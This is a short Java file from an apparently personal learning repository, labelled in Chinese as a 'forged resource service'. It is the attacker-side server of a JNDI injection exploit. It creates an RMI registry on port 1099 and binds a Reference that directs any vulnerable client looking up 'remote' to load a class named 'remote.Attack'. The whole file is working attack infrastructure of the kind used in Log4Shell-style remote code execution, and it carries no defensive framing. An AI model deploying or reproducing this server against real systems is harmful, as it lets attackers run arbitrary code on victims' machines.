package remote;

/**
 * @author Hai
 * @program: learn-everyday
 * @description:
 * @create 2021/12/12 - 23:10
 **/



import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * 伪造资源服务
 */
public class Remote {

    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        // 1. 注册一个jndi 服务
        Registry registry = LocateRegistry.createRegistry(1099);

        Reference reference = new Reference("remote.Attack","remote.Attack",null);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);

        registry.bind("remote",referenceWrapper);
        System.out.println("remote start.........");
    }

}
